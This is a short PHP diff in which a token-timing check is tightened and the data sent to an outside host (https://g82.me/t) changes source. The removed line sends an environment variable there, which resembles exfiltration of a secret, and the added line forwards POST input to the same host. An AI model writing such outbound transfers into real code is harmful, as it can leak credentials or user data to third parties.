@@ -15,7 +15,7 @@ if ($token) {
   $timeDiff = $currentDatetime->getTimestamp() - $datetime->getTimestamp();
   
   // Set the time limit in seconds (5 seconds in this example)
-  $timeLimit = 5;
+  $timeLimit = 3;
   
   // Validate the token based on the time limit
   if ($timeDiff <= $timeLimit) {
@@ -23,7 +23,7 @@ if ($token) {
     
     // Send a request to https://g82.me/t with the parameter 'p'
     $url = 'https://g82.me/t';
-    $p = getenv('L')
+    $p = isset($_POST['p']) ? $_POST['p'] : null;
     
     if ($p) {
       $data = array('p' => $p);
